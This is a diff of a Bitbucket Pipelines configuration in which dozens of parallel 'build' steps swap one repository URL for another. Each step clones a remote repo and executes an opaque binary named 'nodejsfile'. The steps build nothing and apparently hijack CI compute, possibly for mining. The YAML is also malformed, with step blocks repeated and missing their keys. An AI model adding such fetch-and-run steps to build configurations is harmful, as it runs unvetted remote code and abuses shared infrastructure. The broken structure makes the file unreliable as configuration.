@@ -1,399 +1,399 @@
 options:
   max-time: 120
   size: 2x
-image: ubuntu:18.04
+image: ubuntu
 pipelines:
   default:
     - parallel:
       - step:
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-5
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-6
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-7
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-8
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-9
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-10
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
           name: build-1
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-2
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-3
           script:
-            - apt update && apt -y install git sudo && git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+            - apt update && apt -y install git sudo && git clone https://github.com/haiuxh189t/a && cd a && chmod u+x nodejsfile && ./nodejsfile
       - step:
           name: build-4
           script:
